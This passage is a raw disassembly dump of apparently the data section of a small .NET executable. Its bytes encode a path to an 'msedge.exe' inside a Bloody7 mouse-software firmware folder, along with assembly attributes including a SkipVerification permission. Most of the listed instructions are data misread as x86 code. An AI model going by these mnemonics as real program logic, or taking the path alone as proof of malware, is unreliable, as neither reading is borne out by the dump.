  4025ee:	77 43                	ja     0x402633
  4025f0:	00 3a                	add    %bh,(%edx)
  4025f2:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  4025f6:	00 72 00             	add    %dh,0x0(%edx)
  4025f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4025fa:	00 67 00             	add    %ah,0x0(%edi)
  4025fd:	72 00                	jb     0x4025ff
  4025ff:	61                   	popa
  402600:	00 6d 00             	add    %ch,0x0(%ebp)
  402603:	20 00                	and    %al,(%eax)
  402605:	46                   	inc    %esi
  402606:	00 69 00             	add    %ch,0x0(%ecx)
  402609:	6c                   	insb   (%dx),%es:(%edi)
  40260a:	00 65 00             	add    %ah,0x0(%ebp)
  40260d:	73 00                	jae    0x40260f
  40260f:	20 00                	and    %al,(%eax)
  402611:	28 00                	sub    %al,(%eax)
  402613:	78 00                	js     0x402615
  402615:	38 00                	cmp    %al,(%eax)
  402617:	36 00 29             	add    %ch,%ss:(%ecx)
  40261a:	00 5c 00 42          	add    %bl,0x42(%eax,%eax,1)
  40261e:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  402622:	00 6f 00             	add    %ch,0x0(%edi)
  402625:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  402629:	37                   	aaa
  40262a:	00 5c 00 42          	add    %bl,0x42(%eax,%eax,1)
  40262e:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  402632:	00 6f 00             	add    %ch,0x0(%edi)
  402635:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  402639:	37                   	aaa
  40263a:	00 5c 00 46          	add    %bl,0x46(%eax,%eax,1)
  40263e:	00 57 00             	add    %dl,0x0(%edi)
  402641:	5c                   	pop    %esp
  402642:	00 55 00             	add    %dl,0x0(%ebp)
  402645:	53                   	push   %ebx
  402646:	00 42 00             	add    %al,0x0(%edx)
  402649:	5f                   	pop    %edi
  40264a:	00 4d 00             	add    %cl,0x0(%ebp)
  40264d:	30 00                	xor    %al,(%eax)
  40264f:	5c                   	pop    %esp
  402650:	00 6d 00             	add    %ch,0x0(%ebp)
  402653:	73 00                	jae    0x402655
  402655:	65 00 64 00 67       	add    %ah,%gs:0x67(%eax,%eax,1)
  40265a:	00 65 00             	add    %ah,0x0(%ebp)
  40265d:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402661:	78 00                	js     0x402663
  402663:	65 00 00             	add    %al,%gs:(%eax)
  402666:	00 00                	add    %al,(%eax)
  402668:	00 35 4f 52 3b c7    	add    %dh,0xc73b524f
  40266e:	4f                   	dec    %edi
  40266f:	41                   	inc    %ecx
  402670:	93                   	xchg   %eax,%ebx
  402671:	a9 9d bb 4e f0       	test   $0xf04ebb9d,%eax
  402676:	e1 4f                	loope  0x4026c7
  402678:	00 08                	add    %cl,(%eax)
  40267a:	b7 7a                	mov    $0x7a,%bh
  40267c:	5c                   	pop    %esp
  40267d:	56                   	push   %esi
  40267e:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  402681:	89 05 00 01 01 1d    	mov    %eax,0x1d010100
  402687:	0e                   	push   %cs
  402688:	03 20                	add    (%eax),%esp
  40268a:	00 01                	add    %al,(%ecx)
  40268c:	05 20 01 01 11       	add    $0x11010120,%eax
  402691:	0d 04 20 01 01       	or     $0x1012004,%eax
  402696:	08 03                	or     %al,(%ebx)
  402698:	06                   	push   %es
  402699:	1d 0e 03 00 00       	sbb    $0x30e,%eax
  40269e:	01 03                	add    %eax,(%ebx)
  4026a0:	06                   	push   %es
  4026a1:	12 19                	adc    (%ecx),%bl
  4026a3:	04 01                	add    $0x1,%al
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	00 06                	add    %al,(%esi)
  4026a9:	00 02                	add    %al,(%edx)
  4026ab:	0e                   	push   %cs
  4026ac:	0e                   	push   %cs
  4026ad:	1d 0e 06 00 02       	sbb    $0x200060e,%eax
  4026b2:	12 25 0e 0e 05 00    	adc    0x50e0e,%ah
  4026b8:	01 12                	add    %edx,(%edx)
  4026ba:	25 0e 05 20 02       	and    $0x220050e,%eax
  4026bf:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  4026c2:	05 20 01 01 12       	add    $0x12010120,%eax
  4026c7:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  4026ca:	01 12                	add    %edx,(%edx)
  4026cc:	0c 08                	or     $0x8,%al
  4026ce:	01 00                	add    %eax,(%eax)
  4026d0:	08 00                	or     %al,(%eax)
  4026d2:	00 00                	add    %al,(%eax)
  4026d4:	00 00                	add    %al,(%eax)
  4026d6:	1e                   	push   %ds
  4026d7:	01 00                	add    %eax,(%eax)
  4026d9:	01 00                	add    %eax,(%eax)
  4026db:	54                   	push   %esp
  4026dc:	02 16                	add    (%esi),%dl
  4026de:	57                   	push   %edi
  4026df:	72 61                	jb     0x402742
  4026e1:	70 4e                	jo     0x402731
  4026e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4026e5:	45                   	inc    %ebp
  4026e6:	78 63                	js     0x40274b
  4026e8:	65 70 74             	gs jo  0x40275f
  4026eb:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4026f2:	77 73                	ja     0x402767
  4026f4:	01 80 9e 2e 01 80    	add    %eax,-0x7ffed162(%eax)
  4026fa:	84 53 79             	test   %dl,0x79(%ebx)
  4026fd:	73 74                	jae    0x402773
  4026ff:	65 6d                	gs insl (%dx),%es:(%edi)
  402701:	2e 53                	cs push %ebx
  402703:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  402707:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  40270e:	6d 
  40270f:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  402716:	2e 53                	cs push %ebx
  402718:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40271c:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  402723:	69 
  402724:	73 73                	jae    0x402799
  402726:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40272d:	69 62 75 74 65 2c 20 	imul   $0x202c6574,0x75(%edx),%esp
  402734:	6d                   	insl   (%dx),%es:(%edi)
  402735:	73 63                	jae    0x40279a
  402737:	6f                   	outsl  %ds:(%esi),(%dx)
  402738:	72 6c                	jb     0x4027a6
  40273a:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  402741:	73 69                	jae    0x4027ac
  402743:	6f                   	outsl  %ds:(%esi),(%dx)
  402744:	6e                   	outsb  %ds:(%esi),(%dx)
  402745:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40274a:	30 2e                	xor    %ch,(%esi)
  40274c:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  40274f:	43                   	inc    %ebx
  402750:	75 6c                	jne    0x4027be
  402752:	74 75                	je     0x4027c9
  402754:	72 65                	jb     0x4027bb
  402756:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40275b:	72 61                	jb     0x4027be
  40275d:	6c                   	insb   (%dx),%es:(%edi)
  40275e:	2c 20                	sub    $0x20,%al
  402760:	50                   	push   %eax
  402761:	75 62                	jne    0x4027c5
  402763:	6c                   	insb   (%dx),%es:(%edi)
  402764:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  40276b:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  40276f:	62 37                	bound  %esi,(%edi)
  402771:	37                   	aaa
  402772:	61                   	popa
  402773:	35 63 35 36 31       	xor    $0x31363563,%eax
  402778:	39 33                	cmp    %esi,(%ebx)
  40277a:	34 65                	xor    $0x65,%al
  40277c:	30 38                	xor    %bh,(%eax)
  40277e:	39 15 01 54 02 10    	cmp    %edx,0x10025401
  402784:	53                   	push   %ebx
  402785:	6b 69 70 56          	imul   $0x56,0x70(%ecx),%ebp
  402789:	65 72 69             	gs jb  0x4027f5
  40278c:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  402792:	6f                   	outsl  %ds:(%esi),(%dx)
  402793:	6e                   	outsb  %ds:(%esi),(%dx)
  402794:	01 00                	add    %eax,(%eax)
  402796:	00 00                	add    %al,(%eax)
  402798:	c0 27 00             	shlb   $0x0,(%edi)
	...
  4027a3:	00 de                	add    %bl,%dh
  4027a5:	27                   	daa
  4027a6:	00 00                	add    %al,(%eax)
  4027a8:	00 20                	add    %ah,(%eax)
	...
  4027be:	00 00                	add    %al,(%eax)
  4027c0:	d0 27                	shlb   $1,(%edi)
	...
  4027d2:	5f                   	pop    %edi
  4027d3:	43                   	inc    %ebx
  4027d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d5:	72 45                	jb     0x40281c
  4027d7:	78 65                	js     0x40283e
  4027d9:	4d                   	dec    %ebp
  4027da:	61                   	popa
  4027db:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4027e2:	72 65                	jb     0x402849
  4027e4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4027e8:	6c                   	insb   (%dx),%es:(%edi)
  4027e9:	00 00                	add    %al,(%eax)
  4027eb:	00 00                	add    %al,(%eax)
  4027ed:	00 ff                	add    %bh,%bh
  4027ef:	25 00 20 40 00       	and    $0x402000,%eax
